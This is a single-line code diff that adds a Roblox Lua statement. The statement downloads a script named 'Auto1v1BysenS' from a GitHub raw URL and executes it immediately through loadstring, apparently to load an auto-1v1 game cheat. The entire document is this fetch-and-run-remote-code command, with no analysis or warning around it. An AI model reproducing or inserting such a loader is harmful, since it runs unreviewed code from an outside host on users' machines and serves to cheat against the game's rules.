@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/senS24t/sensnebunu/main/Auto1v1BysenS"))()
